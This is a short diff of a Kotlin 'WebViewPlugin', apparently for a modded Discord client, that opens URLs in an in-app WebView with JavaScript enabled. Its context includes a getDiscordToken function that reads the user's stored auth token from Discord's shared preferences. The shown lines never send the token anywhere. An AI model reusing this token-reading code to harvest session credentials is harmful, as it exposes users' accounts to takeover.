@@ -25,7 +25,7 @@ class WebViewPlugin : Plugin() {
             "Opens a URL in an in-app WebView"
         ) { ctx ->
             val url = ctx.rawContent.trim()
-            
+
             if (url.isEmpty()) {
                 return@registerCommand CommandsAPI.CommandResult("Usage: /webview <url>", null, false)
             }
@@ -50,6 +50,7 @@ class WebViewPlugin : Plugin() {
     private fun getDiscordToken(context: Context): String? {
         val prefsNames = listOf("com.discord_preferences", "com.discord")
         val keys = listOf("STORE_AUTHED_TOKEN", "token", "auth_token", "access_token")
+        
         for (name in prefsNames) {
             val prefs = context.getSharedPreferences(name, Context.MODE_PRIVATE)
             for (key in keys) {
@@ -59,6 +60,10 @@ class WebViewPlugin : Plugin() {
         }
         return null
     }
+}
+
+@SuppressLint("SetJavaScriptEnabled")
+class WebViewDialog : DialogFragment() {
 
     companion object {
         private const val ARG_URL = "url"
